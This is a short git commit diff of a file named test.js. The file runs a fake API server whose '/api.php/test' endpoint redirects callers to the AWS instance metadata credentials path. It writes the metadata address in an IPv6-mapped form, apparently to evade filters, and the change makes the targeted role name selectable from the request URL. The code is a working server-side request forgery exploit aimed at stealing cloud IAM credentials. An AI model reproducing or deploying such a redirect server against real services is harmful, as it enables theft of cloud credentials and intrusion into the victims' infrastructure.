adaa7f4d800da296c4221a5c3eb774cf592b9ca6
denny.idehen <denny.idehen@integromat.com>
2022-11-07 10:50:01 +0100

    test

--- test.js
+++ test.js
@@ -13,14 +13,17 @@ let content = "";
 
 const server = https.createServer(options, (req, res) => {
   res.statusCode = 200;
-  console.log(req.url);
+  let ur = req.url;
+  console.log(ur);
+  let u = ur.split("/");
+  u = u[u.length-1];
   if(req.url === "/api.php/me"){
     content = "test";
   }else if(req.url === "/api.php/meta/modules"){
     content = '{"list": [{"module": "test", "primary_model":"model_test", "models": ["model_test"]}]}';
   }else if(req.url === "/api.php/test"){
     res.statusCode = 302;
-    res.setHeader("Location","http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/AWSServiceRoleForAmazonEKS");
+    res.setHeader("Location",`http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/${u}`);
     res.end();
     return;
   }
